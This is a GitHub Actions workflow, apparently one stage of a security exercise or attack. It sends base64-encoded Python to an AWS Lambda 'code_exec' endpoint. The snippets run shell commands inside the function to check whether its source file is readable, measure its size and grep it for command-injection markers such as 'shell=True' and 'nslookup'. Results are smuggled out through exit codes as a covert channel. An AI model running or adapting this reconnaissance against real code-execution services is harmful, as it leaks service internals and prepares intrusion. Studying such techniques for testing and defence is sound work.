name: Stage2-01-Source-Fingerprint

on:
  push:
    branches:
      - corgi

permissions:
  contents: read

jobs:
  fingerprint:
    runs-on: ubuntu-latest

    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
      API_URL: https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec

    steps:
      - name: Install dependencies
        run: |
          python3 -m pip install requests requests-aws4auth --quiet

      - name: Fingerprint deployed Lambda source
        run: |
          python3 - <<'PY'
          import os
          import base64
          import requests
          from requests_aws4auth import AWS4Auth

          auth = AWS4Auth(
              os.environ["AWS_ACCESS_KEY_ID"],
              os.environ["AWS_SECRET_ACCESS_KEY"],
              "us-east-1",
              "execute-api",
              session_token=os.environ["AWS_SESSION_TOKEN"]
          )

          tests = {
              "source_readable": r'''
          import subprocess

          result = subprocess.run(
              ["/bin/sh", "-c", "test -r /var/task/lambda_function.py"]
          )

          raise SystemExit(7 if result.returncode == 0 else 9)
          ''',

              "source_size": r'''
          import subprocess

          result = subprocess.run(
              ["/bin/sh", "-c", "wc -c < /var/task/lambda_function.py"],
              stdout=subprocess.PIPE,
              stderr=subprocess.PIPE,
              text=True
          )

          try:
              size = int(result.stdout.strip())
              raise SystemExit(20 + min(size, 220))
          except SystemExit:
              raise
          except Exception:
              raise SystemExit(19)
          ''',

              "historical_markers": r'''
          import subprocess

          command = (
              "grep -a -E -o "
              "'subprocess|shell=True|nslookup|lambda_handler|"
              "domain[[:space:]]*=[[:space:]]*event' "
              "/var/task/lambda_function.py | sort -u | wc -l"
          )

          result = subprocess.run(
              ["/bin/sh", "-c", command],
              stdout=subprocess.PIPE,
              stderr=subprocess.PIPE,
              text=True
          )

          try:
              count = int(result.stdout.strip())
              raise SystemExit(30 + min(count, 20))
          except SystemExit:
              raise
          except Exception:
              raise SystemExit(19)
          '''
          }

          for name, code in tests.items():
              encoded = base64.b64encode(code.encode()).decode()

              response = requests.post(
                  os.environ["API_URL"],
                  json={"code": encoded},
                  auth=auth,
                  timeout=40
              )

              print(f"TEST={name}")
              print(response.text)
              print("---")
          PY
